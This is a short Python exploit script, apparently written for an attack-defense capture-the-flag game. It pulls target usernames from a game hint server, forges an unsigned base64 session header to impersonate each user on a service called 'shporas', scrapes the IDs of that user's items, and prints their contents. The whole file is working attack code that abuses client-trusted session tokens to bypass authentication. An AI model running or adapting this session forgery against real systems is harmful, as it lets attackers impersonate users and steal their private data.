#!/usr/bin/env python3

import re
import sys
import json
import base64
import requests as rq


def encode_session(username: str) -> str:
    return base64.b64encode(json.dumps({'user': username}).encode()).decode()


host = sys.argv[1]
url = f'http://{host}:5000'

hints = rq.get('http://10.10.10.10/api/client/attack_data').json()


for username in hints['shporas'][host]:
    s = rq.Session()
    s.headers['secure_session'] = encode_session(username)
    shporas = s.get(f'{url}/my-shporas')
    shpora_ids = re.findall(r'<a href="\/shpora\?id=([a-zA-Z0-9]*)">', shporas.text)
    for shpora_id in shpora_ids:
        shpora = s.get(f'{url}/shpora', params={'id': shpora_id}).text
        print(shpora, flush=True)
